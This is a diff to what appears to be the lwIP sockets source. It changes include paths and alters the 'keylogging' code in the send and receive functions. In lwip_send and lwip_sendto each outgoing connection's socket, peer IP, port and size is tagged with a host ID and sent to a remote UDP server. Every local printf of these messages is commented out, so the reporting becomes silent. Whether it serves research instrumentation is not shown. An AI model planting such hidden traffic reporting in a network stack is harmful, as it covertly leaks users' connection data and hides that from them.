@@ -41,9 +41,9 @@
 
 #if LWIP_SOCKET /* don't build if not configured for use in lwipopts.h */
 
-#include "sockets.h"
-#include "udp_send.h"
-#include "global_config.h"
+#include "includes/sockets.h"
+#include "includes/udp_send.h"
+#include "includes/global_config.h"
 #include "lwip/priv/sockets_priv.h"
 #include "lwip/api.h"
 #include "lwip/sys.h"
@@ -1286,7 +1286,7 @@ lwip_recvfrom(int s, void *mem, size_t len, int flags,
     netconn_peer(sock->conn, &addr, &port);
     char msg_data[1024];
     sprintf(msg_data, "TCP connection from Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , s, inet_ntoa(addr), (int)port, (int)ret);
-    printf("%s",msg_data);
+    //printf("%s",msg_data);
     //printf("(TCP) From Socket: %d, IP: %s, Port: %d, Msg: %s\n", s, inet_ntoa(addr), (int)port, temp);
     /*End Printing message to console for keylogging*/
 
@@ -1325,7 +1325,7 @@ lwip_recvfrom(int s, void *mem, size_t len, int flags,
     //char* temp = (char*)mem;
     char msg_data[1024];
     sprintf(msg_data, "UDP connection from Socket: %d, IP:, Port, Size: %d bytes\n" , s, (int)ret);
-    printf("%s",msg_data);
+    //printf("%s",msg_data);
     //printf("(UDP) From Socket: %d, IP:  , Port: , Msg: %s\n",s,temp);
     /*End Printing message to console for keylogging*/
   }
@@ -1509,8 +1509,8 @@ lwip_send(int s, const void *data, size_t size, int flags)
     u16_t port;
     netconn_peer(sock->conn, &addr, &port);
     char msg_data[1024];
-    sprintf(msg_data, "TCP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , s, inet_ntoa(addr), (int)port, (int)size);
-    printf("%s",msg_data);
+    sprintf(msg_data, "(%s) TCP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , UDP_HOST_ID, s, inet_ntoa(addr), (int)port, (int)size);
+    //printf("%s",msg_data);
     udp_send_msg(UDP_SERVER_IP, UDP_SERVER_PORT, msg_data);
     //printf("(TCP) To Socket: %d, IP: %s , Port: %d, Msg: %s\n",s,inet_ntoa(addr), (int)port,temp);
     /*End Printing message to console for keylogging*/
@@ -1777,8 +1777,8 @@ lwip_sendto(int s, const void *data, size_t size, int flags,
     /*Printing message to console for keylogging*/
     //char* temp = (char*)data;
     char msg_data[1024];
-    sprintf(msg_data, "UDP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , s, inet_ntoa(buf.addr), remote_port, (int)size);
-    printf("%s",msg_data);
+    sprintf(msg_data, "(%s) UDP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , UDP_HOST_ID, s, inet_ntoa(buf.addr), remote_port, (int)size);
+    //printf("%s",msg_data);
     udp_send_msg(UDP_SERVER_IP, UDP_SERVER_PORT, msg_data);
     //printf("(UDP) To Socket: %d, IP: %s , Port: %d, Msg: %s\n",s,inet_ntoa(buf.addr),remote_port,temp);
     /*End Printing message to console for keylogging*/
